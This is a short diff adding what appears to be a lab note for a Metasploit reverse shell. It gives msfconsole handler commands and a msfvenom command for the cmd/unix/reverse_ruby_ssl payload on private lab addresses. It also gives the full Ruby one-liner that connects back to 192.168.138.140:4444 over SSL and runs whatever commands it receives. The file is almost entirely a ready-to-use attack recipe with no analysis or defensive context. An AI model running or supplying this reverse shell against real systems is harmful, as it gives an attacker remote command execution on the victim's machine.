@@ -1,0 +1,29 @@
+cmd/unix/reverse_ruby_ssl
+
+
+server 192.168.138.140
+
+msfconsole
+Use exploit/multi/handler
+Set payload cmd/unix/reverse_ruby_ssl
+Set LHOST 0.0.0.0
+Exploit
+
+
+client 192.168.138.141
+
+msfvenom.bat -p cmd/unix/reverse_ruby_ssl LHOST=192. 168.138.140
+
+ruby -rsocket -ropenssl -e 'exit if fork;c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("192.168.138.140","4444")).connect;while(cmd=c.gets);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end'
+
+
+
+
+
+
+
+
+
+
+
+
